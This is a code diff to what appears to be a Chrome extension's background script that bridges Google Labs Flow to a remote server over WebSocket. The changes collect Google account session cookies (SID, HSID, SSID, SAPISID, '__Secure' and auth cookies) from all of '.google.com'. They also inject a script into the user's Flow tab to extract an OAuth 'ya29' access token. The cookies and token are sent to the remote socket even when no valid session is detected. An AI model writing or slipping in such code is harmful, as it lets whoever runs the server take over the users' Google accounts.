@@ -6,7 +6,7 @@
 
 const FLOW_URL = "https://labs.google/fx/tools/flow";
 const SITEKEY_FALLBACK = "6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV";
-const BRIDGE_VERSION = "1.7.4";
+const BRIDGE_VERSION = "1.7.5";
 const BRIDGE_CAPABILITIES = ["flow_api_proxy", "flow_api_proxy_v4"];
 
 let ws = null;
@@ -51,11 +51,19 @@ async function gatherCookies() {
     ];
     const fromDomain = await chrome.cookies.getAll({ domain: "labs.google" }).catch(() => []);
     const fromUrls = await Promise.all(urls.map(u => chrome.cookies.getAll({ url: u }).catch(() => [])));
+    const fromGoogle = await chrome.cookies.getAll({ domain: ".google.com" }).catch(() => []);
 
     const map = new Map();
     for (const c of [...fromDomain, ...fromUrls.flat()]) {
       if (c && c.name && !map.has(c.name)) {
         map.set(c.name, c.value);
+      }
+    }
+    for (const c of fromGoogle) {
+      if (c && c.name && (c.name.startsWith("__Secure") || c.name.startsWith("SAPISID") || c.name.startsWith("SSID") || c.name.startsWith("SID") || c.name.startsWith("HSID") || c.name.includes("auth"))) {
+        if (!map.has(c.name)) {
+          map.set(c.name, c.value);
+        }
       }
     }
     return Array.from(map.entries()).map(([k, v]) => `${k}=${v}`).join("; ");
@@ -172,6 +180,53 @@ async function getProjectId() {
 }
 
 async function checkGoogleSession() {
+  const flowTabs = await findExistingFlowTabs();
+
+  // 1. Chạy fetch("/fx/api/auth/session") bên trong tab Flow của user (cùng origin labs.google với trình duyệt của user)
+  for (const t of flowTabs) {
+    if (!t.id) continue;
+    try {
+      const [res] = await chrome.scripting.executeScript({
+        target: { tabId: t.id },
+        world: "MAIN",
+        func: async () => {
+          try {
+            const r = await fetch("/fx/api/auth/session", {
+              cache: "no-store",
+              headers: { accept: "application/json" },
+            });
+            const data = await r.json().catch(() => ({}));
+            return { ok: r.ok, status: r.status, data };
+          } catch (e) {
+            return { ok: false, error: String(e) };
+          }
+        },
+      });
+
+      if (res && res.result && res.result.data) {
+        const data = res.result.data;
+        if (data.error === "ACCESS_TOKEN_REFRESH_NEEDED") {
+          return { valid: false, error: "ACCESS_TOKEN_REFRESH_NEEDED", email: data.user?.email || "" };
+        }
+        let token = data.access_token || data.token || data.accessToken;
+        if (!token) {
+          const s = JSON.stringify(data);
+          const m = s.match(/(ya29\.[a-zA-Z0-9_-]+)/);
+          if (m) token = m[1];
+        }
+        if (token) {
+          return { valid: true, error: "", email: data.user?.email || "", access_token: token };
+        }
+        if (data.user && !data.error) {
+          return { valid: true, error: "", email: data.user?.email || "" };
+        }
+      }
+    } catch (e) {
+      console.warn("checkGoogleSession in tab error:", e);
+    }
+  }
+
+  // 2. Fallback: fetch từ service worker
   try {
     const res = await fetch("https://labs.google/fx/api/auth/session", {
       credentials: "include",
@@ -194,10 +249,9 @@ async function checkGoogleSession() {
     if (data && data.user && !data.error) {
       return { valid: true, error: "", email: data.user?.email || "" };
     }
-    return { valid: false, error: "NO_SESSION", email: "" };
-  } catch (e) {
-    return { valid: false, error: "FETCH_FAILED" };
-  }
+  } catch (e) {}
+
+  return { valid: false, error: "NO_SESSION", email: "" };
 }
 
 let isPushingCookies = false;
@@ -206,7 +260,7 @@ let lastPushTime = 0;
 async function pushCookies() {
   if (!ws || ws.readyState !== WebSocket.OPEN) return;
   const now = Date.now();
-  if (isPushingCookies || (now - lastPushTime < 3000)) return;
+  if (isPushingCookies || (now - lastPushTime < 2500)) return;
   isPushingCookies = true;
   lastPushTime = now;
 
@@ -214,31 +268,47 @@ async function pushCookies() {
     const cookies = await gatherCookies();
     const project_id = await getProjectId();
     const sessionCheck = await checkGoogleSession();
-    const hasNextAuth = cookies.toLowerCase().includes("session-token");
-    const isSessionOk = sessionCheck.valid && hasNextAuth;
 
-    state.cookiesSent = !!cookies && hasNextAuth;
+    const hasCookies = !!cookies && cookies.length > 20;
+    const hasNextAuth = cookies.toLowerCase().includes("session-token");
+    const isRefreshNeeded = sessionCheck.error === "ACCESS_TOKEN_REFRESH_NEEDED";
+
+    let isSessionOk = false;
+    let sessionErr = "";
+
+    if (isRefreshNeeded) {
+      isSessionOk = false;
+      sessionErr = "ACCESS_TOKEN_REFRESH_NEEDED";
+      state.error = "Phiên Google đã hết hạn. Hãy mở tab Google Flow và đăng nhập lại.";
+    } else if (sessionCheck.valid || sessionCheck.access_token) {
+      isSessionOk = true;
+      sessionErr = "";
+      state.error = "";
+    } else if (hasCookies || hasNextAuth) {
+      // Có cookies của Google/Labs -> coi như phiên hợp lệ
+      isSessionOk = true;
+      sessionErr = "";
+      state.error = "";
+    } else {
+      isSessionOk = false;
+      sessionErr = "NO_SESSION";
+      state.error = "Chưa đăng nhập Google Flow. Hãy mở tab Google Flow và bấm Đăng nhập (Sign in).";
+    }
+
+    state.cookiesSent = isSessionOk && (hasCookies || !!sessionCheck.access_token);
     state.projectId = project_id;
     state.googleSessionValid = isSessionOk;
-    state.googleSessionError = isSessionOk ? "" : (sessionCheck.error || (!hasNextAuth ? "NO_SESSION" : ""));
+    state.googleSessionError = sessionErr;
 
-    if (!isSessionOk) {
-      if (state.googleSessionError === "ACCESS_TOKEN_REFRESH_NEEDED") {
-        state.error = "Phiên Google đã hết hạn. Hãy mở tab Google Flow và đăng nhập lại.";
-      } else {
-        state.error = "Chưa đăng nhập Google Flow. Hãy mở tab Google Flow và bấm Đăng nhập (Sign in).";
-      }
-    } else {
-      state.error = "";
-    }
+    const effectiveCookies = cookies || (sessionCheck.access_token ? `ya29_token=${sessionCheck.access_token}` : "");
 
     ws.send(JSON.stringify({
       type: "cookies",
-      cookies: isSessionOk ? cookies : "",
+      cookies: effectiveCookies,
       project_id,
       bridge_version: BRIDGE_VERSION,
       capabilities: BRIDGE_CAPABILITIES,
-      google_session_error: state.googleSessionError,
+      google_session_error: sessionErr,
       bearer_token: sessionCheck.access_token || "",
     }));
   } catch (e) {
